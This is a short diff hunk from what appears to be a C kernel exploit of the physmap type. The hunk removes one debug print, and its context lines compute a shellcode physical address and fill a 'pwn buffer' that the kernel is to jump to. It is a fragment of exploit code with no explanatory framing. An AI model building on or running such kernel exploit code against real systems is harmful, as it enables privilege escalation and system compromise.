@@ -61,7 +61,6 @@ int main(int argc, char **argv)
     // Calculate shellcode physical address
     uint64_t phys_addr = translate(addr);
     printf("[*] shellcode physmap addr %p\n",phys_addr);
-    printf("[*] global physmap addr %p\n",phys_asdf);
     // Prepare pwn buffer - kernel will jump to third word
     uint64_t *buffer = (uint64_t *)malloc(24);
     buffer[0] = 0x4141414141414141;
